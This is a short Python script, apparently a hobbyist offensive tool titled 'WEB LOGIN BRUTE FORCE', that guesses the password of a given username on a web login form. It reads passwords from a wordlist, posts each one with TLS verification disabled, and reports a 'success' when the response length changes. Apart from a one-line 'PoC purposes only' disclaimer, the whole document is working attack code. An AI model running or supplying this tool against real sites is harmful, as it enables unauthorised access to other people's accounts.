import requests
import sys
import time
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#banner MOTD
z = '''
======================================

    [+] WEB LOGIN BRUTE FORCE [+]
    -----------------------------
    		By: Uns3cure

======================================
'''
for i in z:
	sys.stdout.write(i)
	sys.stdout.flush()
	time.sleep(0.02)

#Disclaimer
print("This tool is for PoC purposes only\n")

#Define initial variables
url = input("Please provide a URL: \n")
user = input("provide a username: \n")
ufield = input("**user** field name from original request: \n ")
pfield = input("**pass** field name from original request: \n ")
print("=======================================================")


#Create empty list for revision change
revList = []


#open directory
with open("DefaultList.txt") as f:
	for line in f:
		line = line.rstrip("\n")
		#Make it slow
		time.sleep(0.2)


		#Post Login Data
		with requests.Session() as s:
			#Get cookies for sesion
			s.get(url, verify=False)
			cookies = s.cookies.get_dict()
			headers = s.headers.update()

			#Set payload and send
			payload = {'Attempt':'Login', ufield:user, pfield:line}
			p = s.post(url, headers=headers, cookies=cookies, data=payload, verify=False)
			soup = BeautifulSoup(p.content, 'html.parser')
			
			#Set variable to compare output change
			rev = len(p.content)
			revList.append(rev)
			#print(cookies)
			#print(revList)
			rev2 = revList[0]
			print('[-]-' + str(payload))

            #print password found
			while rev != rev2:
				print("============================================================")
				print(f"[+]- Success password is: {line}")
				exit()

#print password not found
print("============================================================")		
print("PASSWORD NOT FOUND!\n | Verify that the user exist or POST field names are correct like(username,password or uid,passw) #See Readme File|")